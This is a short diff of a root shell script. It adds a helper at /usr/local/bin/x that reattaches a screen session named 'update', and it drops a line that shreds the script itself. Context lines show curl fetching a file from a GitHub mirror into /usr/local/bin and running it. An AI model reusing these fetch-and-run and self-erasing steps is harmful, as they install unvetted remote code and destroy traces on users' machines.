@@ -110,6 +110,15 @@ var2='curl -sSL https://raw.staticdn.net/xiezh123/132/raw/main/1 -o /usr/local/b
 
 $ $var1 && $var2
 
+# 定义文件路径
+FILE_PATH="/usr/local/bin/x"
+
+# 创建文件并写入命令
+echo "screen -r update" > "$FILE_PATH"
+
+# 赋予可执行权限
+chmod +x "$FILE_PATH"
+
 max_attempts=5
 attempts=0
 while [[ $attempts -lt $max_attempts ]]; do
@@ -126,5 +135,3 @@ while [[ $attempts -lt $max_attempts ]]; do
         sleep 3
     fi
 done
-
-shred -u /root/Quick/6.sh
